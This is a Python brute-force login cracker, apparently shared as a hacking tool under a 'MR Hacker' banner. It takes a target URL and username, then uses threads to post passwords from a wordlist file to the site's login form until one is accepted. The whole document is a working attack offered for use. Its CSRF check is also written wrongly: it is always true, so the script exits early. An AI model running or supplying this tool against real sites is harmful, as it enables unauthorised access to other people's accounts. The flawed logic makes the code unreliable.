
print (""" 
 _______  __   __  _______  __   __  _______  __    _         _______  ______    __   __  _______  _______         _______  _______  ______    _______  _______ 
|       ||  | |  ||       ||  | |  ||       ||  |  | |       |  _    ||    _ |  |  | |  ||       ||       |       |       ||       ||    _ |  |       ||       |
|    _  ||  |_|  ||_     _||  |_|  ||   _   ||   |_| | ____  | |_|   ||   | ||  |  | |  ||_     _||    ___| ____  |    ___||   _   ||   | ||  |       ||    ___|
|   |_| ||       |  |   |  |       ||  | |  ||       ||____| |       ||   |_||_ |  |_|  |  |   |  |   |___ |____| |   |___ |  | |  ||   |_||_ |       ||   |___ 
|    ___||_     _|  |   |  |       ||  |_|  ||  _    |       |  _   | |    __  ||       |  |   |  |    ___|       |    ___||  |_|  ||    __  ||      _||    ___|
|   |      |   |    |   |  |   _   ||       || | |   |       | |_|   ||   |  | ||       |  |   |  |   |___        |   |    |       ||   |  | ||     |_ |   |___ 
|___|      |___|    |___|  |__| |__||_______||_|  |__|       |_______||___|  |_||_______|  |___|  |_______|       |___|    |_______||___|  |_||_______||_______|
    ▟▛▜▟▛▜▟▛ 🄱🅁🅄🅃🄴🄵🄾🅁🄲🄴 ▟▛▜▟▛▜▟▛
             MR Hacker

""")


import threading
import requests
import time
import sys

class BruteForceCracker:
    def __init__(self, url, username, error_message):
        self.url = url
        self.username = username
        self.error_message = error_message
        
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password):
        data_dict = {"LogInID": self.username, "Password": password, "Log In": "submit"}
        response = requests.post(self.url, data=data_dict)
        if self.error_message in str(response.content):
            return False
        elif "CSRF" or "csrf" in str(response.content):
            print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
            sys.exit()
        else:
            print("Username: ---> " + self.username)
            print("Password: ---> " + password)
            return True

def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            return

def main():
    url = input("Enter Target Url: ")
    username = input("Enter Target Username: ")
    error = input("Enter Wrong Password Error Message: ")
    cracker = BruteForceCracker(url, username, error)
    
    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    banner = """ 
                       Checking the Server !!        
        
"""
    print(banner)
    main()
